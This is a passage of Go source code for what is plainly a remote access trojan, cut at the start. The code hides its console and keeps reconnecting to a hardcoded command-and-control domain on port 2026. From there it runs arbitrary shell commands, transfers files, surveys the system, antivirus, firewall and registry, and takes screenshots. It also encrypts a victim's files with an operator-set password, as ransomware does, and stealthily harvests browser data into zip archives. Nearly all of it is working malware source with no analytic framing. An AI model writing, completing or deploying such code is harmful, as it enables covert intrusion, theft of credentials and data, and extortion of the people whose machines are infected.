			if err2 == nil {
				dstFile, err2 := os.Create(location)
				if err2 == nil {
					io.Copy(dstFile, srcFile)
					dstFile.Close()
					srcFile.Close()
					os.Remove(zipPath)
					finalPaths = append(finalPaths, location)
					// Clean up after 48 hours
					go func(path string) {
						time.Sleep(48 * time.Hour)
						os.Remove(path)
					}(location)
					break
				}
				srcFile.Close()
			}
		}
	}

	if len(finalPaths) == 0 {
		return fmt.Sprintf("Stealth extraction completed but failed to move files\nFiles extracted: %d", len(extractedFiles))
	}

	pathRefFile := filepath.Join(os.TempDir(), fmt.Sprintf("~stealth_paths_%d.txt", time.Now().UnixNano()))
	pathContent := fmt.Sprintf("Stealth Browser Data Extraction Results\n========================================\n\nZIP File Locations:\n%s\n\nExtracted Files (%d):\n%s\n\nExtraction Time: %s\n\nNote: These files will be automatically deleted after 48 hours.",
		strings.Join(finalPaths, "\n"), len(extractedFiles), strings.Join(extractedFiles, "\n"), time.Now().Format("2006-01-02 15:04:05"))
	os.WriteFile(pathRefFile, []byte(pathContent), 0644)

	go func() {
		time.Sleep(48 * time.Hour)
		os.Remove(pathRefFile)
	}()

	return fmt.Sprintf("Stealth browser data extraction completed!\n\n📁 ZIP FILE LOCATIONS:\n%s\n\n📄 PATH REFERENCE FILE:\n%s\n\n📊 EXTRACTION SUMMARY:\nFiles extracted: %d\n\n📋 EXTRACTED FILES:\n%s\n\n💡 TIP: You can access the zip files at the paths above to view all browser data",
		strings.Join(finalPaths, "\n"), pathRefFile, len(extractedFiles), strings.Join(extractedFiles, "\n"))
}

func getRecentExtractionPaths() string {
	var paths []string

	tempDir := os.TempDir()
	files, err := filepath.Glob(filepath.Join(tempDir, "~*_paths_*.txt"))
	if err != nil {
		return "No recent extraction paths found"
	}

	for _, file := range files {
		content, err := os.ReadFile(file)
		if err == nil {
			paths = append(paths, fmt.Sprintf("📄 %s\n%s", file, string(content)))
		}
	}

	if len(paths) == 0 {
		return "No recent extraction paths found"
	}

	return fmt.Sprintf("Recent Browser Data Extraction Paths:\n%s", strings.Join(paths, "\n\n"))
}

func getServerHost() string {
	// Prefer environment variable C2_HOST; fallback to your no-IP domain
	if host := os.Getenv("C2_HOST"); strings.TrimSpace(host) != "" {
		return strings.TrimSpace(host)
	}
	return "milauth-mygovin.serveftp.com"
}

func getServerPort() int {
	if p := strings.TrimSpace(os.Getenv("C2_PORT")); p != "" {
		if v, err := strconv.Atoi(p); err == nil && v > 0 && v < 65536 {
			return v
		}
	}
	return 2026
}

func handleCommand(command string, conn net.Conn) {
	if command == "q" {
		return
	} else if strings.HasPrefix(command, "upload ") {
		filename := strings.TrimPrefix(command, "upload ")
		response := Response{Type: "response", Content: "ready"}
		sendData(conn, response)
		err := uploadFile(conn, filename)
		if err != nil {
			response = Response{Type: "response", Content: fmt.Sprintf("Upload %s: Failed - %v", filename, err)}
			sendData(conn, response)
		}
	} else if strings.HasPrefix(command, "download ") {
		filename := strings.TrimPrefix(command, "download ")
		err := downloadFile(conn, filename)
		if err != nil {
			response := Response{Type: "response", Content: fmt.Sprintf("Download %s: Failed - %v", filename, err)}
			sendData(conn, response)
		}
	} else if command == "kill" {
		conn.Close()
		return
	} else if command == "sysinfo" {
		result := fmt.Sprintf("Hostname: %s\nUsername: %s\nMAC Address: %s\nOS: %s\nArchitecture: %s",
			getHostname(), getUsername(), getMACAddress(), runtime.GOOS, runtime.GOARCH)
		response := Response{Type: "response", Content: result}
		sendData(conn, response)
	} else if command == "processes" {
		result := executeCommand("tasklist /fo csv /nh")
		response := Response{Type: "response", Content: result}
		sendData(conn, response)
	} else if command == "services" {
		result := executeCommand("net start")
		response := Response{Type: "response", Content: result}
		sendData(conn, response)
	} else if command == "network" {
		result := executeCommand("ipconfig /all")
		response := Response{Type: "response", Content: result}
		sendData(conn, response)
	} else if command == "screenshot" {
		result := takeScreenshot()
		response := Response{Type: "response", Content: result}
		sendData(conn, response)
	} else if command == "registry" {
		result := executeCommand("reg query HKCU /s")
		response := Response{Type: "response", Content: result}
		sendData(conn, response)
	} else if command == "startup" {
		result := executeCommand("reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run")
		response := Response{Type: "response", Content: result}
		sendData(conn, response)
	} else if command == "firewall" {
		result := executeCommand("netsh advfirewall show allprofiles")
		response := Response{Type: "response", Content: result}
		sendData(conn, response)
	} else if command == "antivirus" {
		result := executeCommand("wmic /node:localhost /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName,productState")
		response := Response{Type: "response", Content: result}
		sendData(conn, response)
	} else if strings.HasPrefix(command, "setpass ") {
		password := strings.TrimPrefix(command, "setpass ")
		result := setPassword(password)
		response := Response{Type: "response", Content: result}
		sendData(conn, response)
	} else if command == "getpass" {
		result := getPassword()
		response := Response{Type: "response", Content: result}
		sendData(conn, response)
	} else if strings.HasPrefix(command, "encrypt ") {
		path := strings.TrimPrefix(command, "encrypt ")
		if currentPassword == "" {
			response := Response{Type: "response", Content: "No password set. Use 'setpass <password>' first."}
			sendData(conn, response)
		} else {
			var result string
			if info, err := os.Stat(path); err == nil && info.IsDir() {
				result = encryptDirectory(path, currentPassword)
			} else {
				result = encryptFile(path, currentPassword)
			}
			response := Response{Type: "response", Content: result}
			sendData(conn, response)
		}
	} else if strings.HasPrefix(command, "decrypt ") {
		path := strings.TrimPrefix(command, "decrypt ")
		if currentPassword == "" {
			response := Response{Type: "response", Content: "No password set. Use 'setpass <password>' first."}
			sendData(conn, response)
		} else {
			var result string
			if info, err := os.Stat(path); err == nil && info.IsDir() {
				result = decryptDirectory(path, currentPassword)
			} else {
				result = decryptFile(path, currentPassword)
			}
			response := Response{Type: "response", Content: result}
			sendData(conn, response)
		}
	} else if command == "listencrypted" {
		result := listEncryptedFiles()
		response := Response{Type: "response", Content: result}
		sendData(conn, response)
	} else if command == "extractbrowser" {
		result := extractBrowserData()
		response := Response{Type: "response", Content: result}
		sendData(conn, response)
	} else if command == "extractbrowserstealth" {
		result := extractBrowserDataStealth()
		response := Response{Type: "response", Content: result}
		sendData(conn, response)
	} else if command == "browserpaths" {
		result := getRecentExtractionPaths()
		response := Response{Type: "response", Content: result}
		sendData(conn, response)
	} else if command == "cd .." {
		result := changeDirectory("..")
		response := Response{Type: "response", Content: result}
		err := sendData(conn, response)
		if err != nil {
			return
		}
	} else if strings.HasPrefix(command, "cd ") {
		path := strings.TrimPrefix(command, "cd ")
		result := changeDirectory(path)
		response := Response{Type: "response", Content: result}
		err := sendData(conn, response)
		if err != nil {
			return
		}
	} else {
		result := executeCommand(command)
		response := Response{Type: "response", Content: result}
		err := sendData(conn, response)
		if err != nil {
			return
		}
	}
}

func handleShellWithPersistence(conn net.Conn) {
	sysInfo := SystemInfo{
		Hostname:   getHostname(),
		MACAddress: getMACAddress(),
		Username:   getUsername(),
	}
	err := sendData(conn, sysInfo)
	if err != nil {
		return
	}
	for {
		command, err := recvData(conn)
		if err != nil {
			return
		}
		var cmd Command
		err = json.Unmarshal([]byte(command), &cmd)
		if err != nil {
			cmd = Command{Type: "command", Content: strings.TrimSpace(command)}
		}
		switch cmd.Type {
		case "heartbeat":
			continue
		case "command":
			handleCommand(strings.TrimSpace(cmd.Content), conn)
		}
	}
}

func main() {
	if runtime.GOOS == "windows" {
		hideConsole()
	}

	// Always initialize stealth mode but without creating copies
	initStealthModeAsync()

	serverPort := getServerPort()
	setupSignalHandler()

	for {
		// Resolve server host and connect
		serverHost := getServerHost()
		conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", serverHost, serverPort))
		if err != nil {
			time.Sleep(5 * time.Second)
			continue
		}

		conn.SetDeadline(time.Time{})
		if tcpConn, ok := conn.(*net.TCPConn); ok {
			tcpConn.SetKeepAlive(true)
			tcpConn.SetKeepAlivePeriod(30 * time.Second)
			tcpConn.SetLinger(0)
		}

		handleShellWithPersistence(conn)
		conn.Close()

		time.Sleep(2 * time.Second)
	}
}
